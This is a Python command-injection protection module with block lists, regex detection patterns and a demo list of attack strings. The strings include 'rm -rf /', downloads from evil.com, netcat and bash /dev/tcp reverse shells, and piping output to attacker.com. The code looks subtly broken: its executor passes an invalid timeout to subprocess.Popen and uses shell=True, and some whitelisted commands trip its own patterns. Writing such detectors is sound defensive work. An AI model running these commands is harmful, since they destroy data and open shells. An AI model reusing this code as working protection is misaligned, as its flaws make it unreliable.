#!/usr/bin/env python3
"""
Claude Bridge System - Command Injection Protection
Advanced command injection prevention and system command sanitization
"""

import os
import re
import shlex
import subprocess
import logging
from typing import Any, Dict, List, Optional, Tuple, Union
from dataclasses import dataclass
from enum import Enum
import time
import pwd
import grp


class CommandRisk(Enum):
    """Command risk levels"""
    SAFE = "SAFE"
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"
    BLOCKED = "BLOCKED"


@dataclass
class CommandAnalysis:
    """Command analysis result"""
    command: str
    is_safe: bool
    risk_level: CommandRisk
    detected_patterns: List[str]
    sanitized_command: Optional[str]
    allowed_execution: bool
    warnings: List[str]
    metadata: Dict[str, Any]


class CommandProtectionManager:
    """Advanced command injection protection manager"""

    # Extremely dangerous commands that should never be allowed
    BLOCKED_COMMANDS = {
        'rm', 'del', 'deltree', 'format', 'fdisk', 'dd', 'mkfs', 'fsck',
        'shutdown', 'reboot', 'halt', 'poweroff', 'init', 'telinit',
        'kill', 'killall', 'pkill', 'xkill', 'fuser',
        'mount', 'umount', 'swapon', 'swapoff',
        'iptables', 'ipfw', 'pfctl', 'firewall-cmd',
        'crontab', 'at', 'batch',
        'useradd', 'userdel', 'usermod', 'groupadd', 'groupdel', 'groupmod',
        'passwd', 'chpasswd', 'pwconv', 'pwunconv',
        'su', 'sudo', 'visudo',
        'chroot', 'jail',
        'service', 'systemctl', 'rc-service', 'invoke-rc.d',
        'insmod', 'rmmod', 'modprobe', 'depmod',
        'ifconfig', 'route', 'arp', 'netstat',
        'nc', 'netcat', 'telnet', 'ssh', 'scp', 'rsync', 'ftp', 'tftp',
        'curl', 'wget', 'lynx', 'w3m',
        'mail', 'sendmail', 'postfix', 'exim',
        'apache2', 'httpd', 'nginx', 'lighttpd',
        'mysql', 'mysqld', 'postgres', 'mongod',
        'docker', 'kubectl', 'podman',
        'vagrant', 'virtualbox', 'vmware',
        'git', 'svn', 'hg', 'bzr',
        'make', 'cmake', 'configure', 'gcc', 'g++', 'clang',
        'python', 'python3', 'perl', 'ruby', 'php', 'node', 'java',
        'bash', 'sh', 'csh', 'tcsh', 'zsh', 'fish', 'ksh',
        'vim', 'emacs', 'nano', 'vi', 'joe', 'pico',
        'screen', 'tmux', 'nohup', 'disown'
    }

    # Dangerous command patterns
    DANGEROUS_PATTERNS = [
        # Command chaining
        r'[;&|`$()]',
        r'&&|\|\|',
        
        # Redirection
        r'[<>]+',
        r'\d*>\s*&?\d*',
        r'\d*<\s*&?\d*',
        
        # Command substitution
        r'\$\(',
        r'`[^`]*`',
        r'\$\{[^}]*\}',
        
        # Process substitution
        r'<\(',
        r'>\(',
        
        # Globbing and expansion
        r'\*|\?|\[.*\]|\{.*\}',
        r'~[^/\s]*',
        
        # Environment variables
        r'\$[A-Za-z_][A-Za-z0-9_]*',
        r'\$[0-9@#?$!_*-]',
        
        # Escape sequences
        r'\\[abfnrtv\\"]',
        r'\\[0-7]{1,3}',
        r'\\x[0-9a-fA-F]{1,2}',
        
        # Script execution
        r'\.(sh|pl|py|rb|php|js|bat|cmd|ps1)(\s|$)',
        
        # Network operations
        r'\b(wget|curl|nc|netcat|telnet|ssh|ftp)\b',
        
        # File operations
        r'\b(cat|head|tail|more|less|grep|awk|sed|sort|uniq|wc)\b\s+[^|\s]',
        
        # System information
        r'\b(ps|top|htop|who|w|id|whoami|uname|hostname|uptime|df|du|free|lsof|netstat|ss)\b',
        
        # Archive operations
        r'\b(tar|zip|unzip|gzip|gunzip|bzip2|bunzip2|xz|unxz|7z)\b',
        
        # Package management
        r'\b(apt|yum|dnf|rpm|dpkg|pip|npm|gem|composer)\b',
        
        # Text editors (potential for file modification)
        r'\b(vi|vim|emacs|nano|joe|pico)\b',
        
        # Compiler/interpreter execution
        r'\b(gcc|g\+\+|clang|make|python|perl|ruby|php|node|java)\b',
        
        # Database operations
        r'\b(mysql|psql|sqlite|mongo)\b',
        
        # Container operations
        r'\b(docker|podman|kubectl|lxc)\b'
    ]

    # Whitelist of safe commands (very restrictive)
    SAFE_COMMANDS = {
        'echo', 'printf', 'true', 'false', 'yes', 'no',
        'date', 'cal', 'uptime', 'whoami', 'id',
        'pwd', 'basename', 'dirname', 'realpath',
        'wc', 'sort', 'uniq', 'cut', 'tr', 'fold', 'fmt',
        'base64', 'md5sum', 'sha1sum', 'sha256sum', 'sha512sum',
        'sleep', 'timeout'
    }

    # Allowed characters in command arguments
    SAFE_ARGUMENT_CHARS = set(
        'abcdefghijklmnopqrstuvwxyz'
        'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        '0123456789'
        '.-_/=:'
    )

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """Initialize command protection manager"""
        self.config = config or {}
        self.logger = logging.getLogger(__name__)
        self.strict_mode = self.config.get('strict_mode', True)
        self.allow_safe_commands_only = self.config.get('allow_safe_commands_only', True)
        self.max_command_length = self.config.get('max_command_length', 1000)
        self.max_argument_length = self.config.get('max_argument_length', 500)
        self.allowed_users = set(self.config.get('allowed_users', []))
        self.blocked_users = set(self.config.get('blocked_users', ['root', 'admin']))

    def analyze_command(self, command: str, user: Optional[str] = None) -> CommandAnalysis:
        """Analyze command for injection attempts"""
        if not command or not isinstance(command, str):
            return CommandAnalysis(
                command="",
                is_safe=False,
                risk_level=CommandRisk.CRITICAL,
                detected_patterns=["Empty or invalid command"],
                sanitized_command=None,
                allowed_execution=False,
                warnings=["Command is empty or not a string"],
                metadata={"analysis_time": time.time()}
            )

        command = command.strip()
        detected_patterns = []
        warnings = []
        metadata = {
            "analysis_time": time.time(),
            "original_length": len(command),
            "user": user
        }

        # Check command length
        if len(command) > self.max_command_length:
            warnings.append(f"Command exceeds maximum length ({len(command)} > {self.max_command_length})")
            metadata["oversized"] = True

        # Parse command to extract base command and arguments
        try:
            parsed_args = shlex.split(command)
            if not parsed_args:
                return CommandAnalysis(
                    command=command,
                    is_safe=False,
                    risk_level=CommandRisk.CRITICAL,
                    detected_patterns=["No command found after parsing"],
                    sanitized_command=None,
                    allowed_execution=False,
                    warnings=["Empty command after parsing"],
                    metadata=metadata
                )
            
            base_command = os.path.basename(parsed_args[0])
            metadata["base_command"] = base_command
            metadata["argument_count"] = len(parsed_args) - 1
            
        except ValueError as e:
            detected_patterns.append(f"Command parsing error: {str(e)}")
            base_command = command.split()[0] if command.split() else ""
            parsed_args = []

        # Check if command is blocked
        if base_command.lower() in self.BLOCKED_COMMANDS:
            detected_patterns.append(f"Blocked command: {base_command}")
            metadata["blocked_command"] = True

        # Check if using safe commands only mode
        if self.allow_safe_commands_only and base_command.lower() not in self.SAFE_COMMANDS:
            detected_patterns.append(f"Command not in safe whitelist: {base_command}")
            metadata["not_whitelisted"] = True

        # Check for dangerous patterns
        dangerous_patterns = self._check_dangerous_patterns(command)
        if dangerous_patterns:
            detected_patterns.extend(dangerous_patterns)
            metadata["dangerous_patterns"] = dangerous_patterns

        # Check user permissions
        user_issues = self._check_user_permissions(user)
        if user_issues:
            detected_patterns.extend(user_issues)
            metadata["user_issues"] = user_issues

        # Check arguments
        if parsed_args:
            arg_issues = self._check_arguments(parsed_args[1:])
            if arg_issues:
                detected_patterns.extend(arg_issues)
                metadata["argument_issues"] = arg_issues

        # Check for path traversal in arguments
        path_issues = self._check_path_traversal(command)
        if path_issues:
            detected_patterns.extend(path_issues)
            metadata["path_issues"] = path_issues

        # Check for encoding attacks
        encoding_issues = self._check_encoding_attacks(command)
        if encoding_issues:
            detected_patterns.extend(encoding_issues)
            metadata["encoding_issues"] = encoding_issues

        # Calculate risk level
        risk_level = self._calculate_risk_level(detected_patterns, base_command, user)
        metadata["risk_score"] = len(detected_patterns)

        # Determine if command execution is allowed
        allowed_execution = self._should_allow_execution(risk_level, detected_patterns, base_command)

        # Determine if command is safe
        is_safe = risk_level in [CommandRisk.SAFE, CommandRisk.LOW] and allowed_execution

        # Generate sanitized command if possible
        sanitized_command = None
        if allowed_execution and parsed_args:
            sanitized_command = self._sanitize_command(parsed_args)

        return CommandAnalysis(
            command=command,
            is_safe=is_safe,
            risk_level=risk_level,
            detected_patterns=detected_patterns,
            sanitized_command=sanitized_command,
            allowed_execution=allowed_execution,
            warnings=warnings,
            metadata=metadata
        )

    def _check_dangerous_patterns(self, command: str) -> List[str]:
        """Check for dangerous command patterns"""
        detected = []
        
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                detected.append(f"Dangerous pattern: {pattern}")
                
        # Additional checks for specific attack vectors
        
        # Command chaining detection
        if any(char in command for char in [';', '&', '|', '`']):
            detected.append("Command chaining detected")
            
        # Shell metacharacters
        metacharacters = ['$', '(', ')', '{', '}', '[', ']', '<', '>', '*', '?', '~']
        found_meta = [char for char in metacharacters if char in command]
        if found_meta:
            detected.append(f"Shell metacharacters: {', '.join(found_meta)}")
            
        # Quote manipulation
        if command.count('"') % 2 != 0 or command.count("'") % 2 != 0:
            detected.append("Unbalanced quotes detected")
            
        # Null byte injection
        if '\x00' in command:
            detected.append("Null byte injection detected")
            
        return detected

    def _check_user_permissions(self, user: Optional[str]) -> List[str]:
        """Check user permissions and restrictions"""
        issues = []
        
        if not user:
            issues.append("No user specified for command execution")
            return issues
            
        # Check blocked users
        if user in self.blocked_users:
            issues.append(f"User '{user}' is blocked from command execution")
            
        # Check allowed users list (if configured)
        if self.allowed_users and user not in self.allowed_users:
            issues.append(f"User '{user}' is not in allowed users list")
            
        # Check if user exists (on Unix systems)
        try:
            pwd.getpwnam(user)
        except KeyError:
            issues.append(f"User '{user}' does not exist on system")
        except:
            # Not on Unix system or other error
            pass
            
        return issues

    def _check_arguments(self, arguments: List[str]) -> List[str]:
        """Check command arguments for suspicious content"""
        issues = []
        
        for i, arg in enumerate(arguments):
            # Check argument length
            if len(arg) > self.max_argument_length:
                issues.append(f"Argument {i+1} exceeds maximum length ({len(arg)} > {self.max_argument_length})")
                
            # Check for suspicious characters
            suspicious_chars = set(arg) - self.SAFE_ARGUMENT_CHARS
            if suspicious_chars:
                issues.append(f"Argument {i+1} contains suspicious characters: {', '.join(suspicious_chars)}")
                
            # Check for encoded content
            if '%' in arg and re.search(r'%[0-9a-fA-F]{2}', arg):
                issues.append(f"Argument {i+1} contains URL encoding")
                
            # Check for binary data
            if any(ord(c) < 32 and c not in '\t\n\r' for c in arg):
                issues.append(f"Argument {i+1} contains binary data")
                
        return issues

    def _check_path_traversal(self, command: str) -> List[str]:
        """Check for path traversal attempts"""
        issues = []
        
        # Directory traversal patterns
        traversal_patterns = [
            r'\.\./+',
            r'\.\.\\+',
            r'%2e%2e%2f',
            r'%2e%2e%5c',
            r'..%2f',
            r'..%5c'
        ]
        
        for pattern in traversal_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                issues.append("Path traversal attempt detected")
                break
                
        # Check for absolute paths to sensitive directories
        sensitive_paths = [
            '/etc/', '/root/', '/home/', '/var/', '/usr/bin/', '/usr/sbin/',
            '/bin/', '/sbin/', '/proc/', '/sys/', '/dev/', '/tmp/',
            'C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Users\\'
        ]
        
        for path in sensitive_paths:
            if path.lower() in command.lower():
                issues.append(f"Access to sensitive path: {path}")
                
        return issues

    def _check_encoding_attacks(self, command: str) -> List[str]:
        """Check for encoding-based attacks"""
        issues = []
        
        # URL encoding
        if re.search(r'%[0-9a-fA-F]{2}', command):
            issues.append("URL encoding detected")
            
        # Hex encoding
        if re.search(r'\\x[0-9a-fA-F]{2}', command):
            issues.append("Hex encoding detected")
            
        # Octal encoding
        if re.search(r'\\[0-7]{3}', command):
            issues.append("Octal encoding detected")
            
        # Unicode encoding
        if re.search(r'\\u[0-9a-fA-F]{4}', command):
            issues.append("Unicode encoding detected")
            
        # Base64 (rough detection)
        if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', command):
            issues.append("Potential Base64 encoding detected")
            
        return issues

    def _calculate_risk_level(self, detected_patterns: List[str], base_command: str, user: Optional[str]) -> CommandRisk:
        """Calculate risk level based on detected patterns"""
        pattern_count = len(detected_patterns)
        
        # Check for blocked commands first
        if base_command.lower() in self.BLOCKED_COMMANDS:
            return CommandRisk.BLOCKED
            
        # Check for critical patterns
        critical_patterns = [
            "command chaining", "null byte", "blocked command",
            "user 'root'", "user 'admin'"
        ]
        
        if any(any(crit in pattern.lower() for crit in critical_patterns) for pattern in detected_patterns):
            return CommandRisk.CRITICAL
            
        # Risk based on pattern count
        if pattern_count >= 5:
            return CommandRisk.CRITICAL
        elif pattern_count >= 3:
            return CommandRisk.HIGH
        elif pattern_count >= 2:
            return CommandRisk.MEDIUM
        elif pattern_count >= 1:
            return CommandRisk.LOW
        else:
            # Even safe commands have some risk
            if base_command.lower() in self.SAFE_COMMANDS:
                return CommandRisk.SAFE
            else:
                return CommandRisk.LOW

    def _should_allow_execution(self, risk_level: CommandRisk, detected_patterns: List[str], base_command: str) -> bool:
        """Determine if command execution should be allowed"""
        # Never allow blocked commands
        if risk_level == CommandRisk.BLOCKED:
            return False
            
        # Never allow critical risk
        if risk_level == CommandRisk.CRITICAL:
            return False
            
        # In strict mode, only allow safe and low risk
        if self.strict_mode:
            return risk_level in [CommandRisk.SAFE, CommandRisk.LOW]
        else:
            # In non-strict mode, allow up to medium risk
            return risk_level in [CommandRisk.SAFE, CommandRisk.LOW, CommandRisk.MEDIUM]

    def _sanitize_command(self, parsed_args: List[str]) -> str:
        """Sanitize command arguments"""
        sanitized_args = []
        
        for arg in parsed_args:
            # Remove potentially dangerous characters
            sanitized = re.sub(r'[;&|`$()<>*?[\]{}~]', '', arg)
            
            # Remove null bytes and control characters
            sanitized = ''.join(c for c in sanitized if ord(c) >= 32 or c in '\t\n\r')
            
            # Trim whitespace
            sanitized = sanitized.strip()
            
            if sanitized:  # Only add non-empty arguments
                sanitized_args.append(shlex.quote(sanitized))
                
        return ' '.join(sanitized_args)

    def execute_safe_command(self, command: str, user: Optional[str] = None, 
                           timeout: int = 30, cwd: Optional[str] = None) -> Tuple[bool, str, str, List[str]]:
        """Execute command with safety checks"""
        errors = []
        
        try:
            # Analyze command first
            analysis = self.analyze_command(command, user)
            
            if not analysis.allowed_execution:
                errors.extend(analysis.detected_patterns)
                return False, "", "", errors
                
            # Use sanitized command if available
            if analysis.sanitized_command:
                command_to_execute = analysis.sanitized_command
            else:
                command_to_execute = command
                
            # Execute with safety measures
            process = subprocess.Popen(
                command_to_execute,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
                cwd=cwd,
                # Security measures
                preexec_fn=lambda: os.setpgrp()  # Create new process group
            )
            
            stdout, stderr = process.communicate(timeout=timeout)
            return_code = process.returncode
            
            success = return_code == 0
            return success, stdout, stderr, []
            
        except subprocess.TimeoutExpired:
            errors.append(f"Command execution timed out after {timeout} seconds")
            try:
                process.kill()
                process.communicate()
            except:
                pass
            return False, "", "", errors
        except subprocess.CalledProcessError as e:
            errors.append(f"Command execution failed: {str(e)}")
            return False, "", str(e), errors
        except Exception as e:
            errors.append(f"Execution error: {str(e)}")
            return False, "", "", errors

    def get_security_report(self, commands: List[str]) -> Dict[str, Any]:
        """Generate security report for multiple commands"""
        total_commands = len(commands)
        safe_commands = 0
        allowed_commands = 0
        risk_distribution = {risk.value: 0 for risk in CommandRisk}
        all_patterns = []
        blocked_commands = []
        
        for command in commands:
            analysis = self.analyze_command(command)
            
            if analysis.is_safe:
                safe_commands += 1
                
            if analysis.allowed_execution:
                allowed_commands += 1
                
            risk_distribution[analysis.risk_level.value] += 1
            all_patterns.extend(analysis.detected_patterns)
            
            if analysis.risk_level == CommandRisk.BLOCKED:
                blocked_commands.append(command)
        
        # Calculate statistics
        safety_rate = (safe_commands / total_commands * 100) if total_commands > 0 else 0
        allowed_rate = (allowed_commands / total_commands * 100) if total_commands > 0 else 0
        
        # Most common patterns
        pattern_counts = {}
        for pattern in all_patterns:
            pattern_counts[pattern] = pattern_counts.get(pattern, 0) + 1
        
        most_common_patterns = dict(sorted(pattern_counts.items(), 
                                         key=lambda x: x[1], reverse=True)[:10])
        
        return {
            "total_commands": total_commands,
            "safe_commands": safe_commands,
            "allowed_commands": allowed_commands,
            "blocked_commands": len(blocked_commands),
            "safety_rate": round(safety_rate, 2),
            "allowed_rate": round(allowed_rate, 2),
            "risk_distribution": risk_distribution,
            "most_common_attack_patterns": most_common_patterns,
            "blocked_command_examples": blocked_commands[:5],
            "recommendations": self._generate_recommendations(risk_distribution, safety_rate, allowed_rate)
        }

    def _generate_recommendations(self, risk_distribution: Dict[str, int], 
                                safety_rate: float, allowed_rate: float) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if safety_rate < 30:
            recommendations.append("CRITICAL: Less than 30% of commands are safe. Immediate security review required.")
        elif safety_rate < 70:
            recommendations.append("WARNING: Command safety rate is below 70%. Review command validation.")
        
        if allowed_rate < 50:
            recommendations.append("INFO: Less than 50% of commands are allowed for execution.")
        
        if risk_distribution["BLOCKED"] > 0:
            recommendations.append("BLOCKED: Some commands are completely blocked for security reasons.")
        
        if risk_distribution["CRITICAL"] > 0:
            recommendations.append("CRITICAL: Critical risk commands detected. These must be blocked.")
        
        if risk_distribution["HIGH"] > 0:
            recommendations.append("HIGH: High risk commands found. Additional security measures needed.")

        # General recommendations
        recommendations.extend([
            "Use command whitelisting instead of blacklisting",
            "Implement strict input validation and sanitization",
            "Run commands with minimal privileges (non-root user)",
            "Use containerization or sandboxing for command execution",
            "Log all command executions for auditing",
            "Implement rate limiting for command execution",
            "Regular security audits of command execution patterns"
        ])
        
        return recommendations


def main():
    """Demo command protection functionality"""
    cmd_protection = CommandProtectionManager()
    
    # Test commands with various injection attempts
    test_commands = [
        # Safe commands
        "echo Hello World",
        "date",
        "whoami",
        "pwd",
        
        # Dangerous commands
        "rm -rf /",
        "sudo rm -rf /",
        "format c:",
        "del /f /s /q C:\\*",
        
        # Command injection attempts
        "echo test; rm -rf /",
        "ls | rm -rf /",
        "cat /etc/passwd",
        "wget http://evil.com/malware.sh",
        "curl -o /tmp/evil http://evil.com/malware",
        "nc -l 4444 -e /bin/bash",
        "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        
        # Shell metacharacters
        "echo `rm -rf /`",
        "echo $(rm -rf /)",
        "echo test && rm -rf /",
        "echo test || rm -rf /",
        "echo test & rm -rf / &",
        
        # Path traversal
        "cat ../../../etc/passwd",
        "ls ../../../../",
        "echo test > /etc/hosts",
        
        # Encoding attacks  
        "echo %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "echo \\x2e\\x2e\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64",
        
        # Quote manipulation
        "echo 'test'; rm -rf /; echo 'end'",
        'echo "test"; rm -rf /; echo "end"',
        "echo test' && rm -rf / && echo 'end",
        
        # Null byte injection
        "cat /etc/passwd\x00.txt",
        
        # Process substitution
        "echo <(rm -rf /)",
        "echo >(rm -rf /)",
        
        # Variable expansion
        "echo $USER && rm -rf /",
        "echo ${HOME} && rm -rf /",
        "echo $0 && rm -rf /",
        
        # Redirection attacks
        "echo malicious > /etc/hosts",
        "cat /etc/passwd > /tmp/stolen",
        "ls 2>&1 | nc attacker.com 4444"
    ]
    
    print("🛡️ Command Injection Protection Demo")
    print("=" * 50)
    
    # Analyze each command
    for i, command in enumerate(test_commands, 1):
        print(f"\n{i}. Command: {command}")
        
        analysis = cmd_protection.analyze_command(command, "testuser")
        
        print(f"   Safe: {analysis.is_safe}")
        print(f"   Risk Level: {analysis.risk_level.value}")
        print(f"   Execution Allowed: {analysis.allowed_execution}")
        
        if analysis.detected_patterns:
            print(f"   Detected Patterns: {len(analysis.detected_patterns)}")
            for pattern in analysis.detected_patterns[:2]:  # Show first 2
                print(f"     - {pattern}")
            if len(analysis.detected_patterns) > 2:
                print(f"     ... and {len(analysis.detected_patterns) - 2} more")
        
        if analysis.sanitized_command:
            print(f"   Sanitized: {analysis.sanitized_command}")
    
    # Generate security report
    print(f"\n📊 Security Report")
    print("=" * 30)
    
    report = cmd_protection.get_security_report(test_commands)
    
    print(f"Total Commands: {report['total_commands']}")
    print(f"Safe Commands: {report['safe_commands']}")
    print(f"Allowed Commands: {report['allowed_commands']}")
    print(f"Blocked Commands: {report['blocked_commands']}")
    print(f"Safety Rate: {report['safety_rate']}%")
    print(f"Allowed Rate: {report['allowed_rate']}%")
    
    print(f"\nRisk Distribution:")
    for risk, count in report['risk_distribution'].items():
        print(f"  {risk}: {count}")
    
    print(f"\nTop Attack Patterns:")
    for pattern, count in list(report['most_common_attack_patterns'].items())[:5]:
        print(f"  {pattern}: {count}")
    
    print(f"\nBlocked Command Examples:")
    for cmd in report['blocked_command_examples']:
        print(f"  - {cmd}")
    
    print(f"\nRecommendations:")
    for rec in report['recommendations'][:5]:
        print(f"  - {rec}")
    
    # Test safe execution
    print(f"\n🔐 Safe Command Execution Test")
    print("=" * 35)
    
    # Test safe command
    safe_cmd = "echo Hello World"
    success, stdout, stderr, errors = cmd_protection.execute_safe_command(safe_cmd, "testuser")
    print(f"Safe Command: {safe_cmd}")
    print(f"  Success: {success}")
    print(f"  Output: {stdout.strip()}")
    print(f"  Errors: {errors}")
    
    # Test unsafe command
    unsafe_cmd = "echo test; ls -la"
    success, stdout, stderr, errors = cmd_protection.execute_safe_command(unsafe_cmd, "testuser")
    print(f"\nUnsafe Command: {unsafe_cmd}")
    print(f"  Success: {success}")
    print(f"  Output: {stdout.strip() if stdout else 'None'}")
    print(f"  Errors: {errors}")


if __name__ == "__main__":
    main()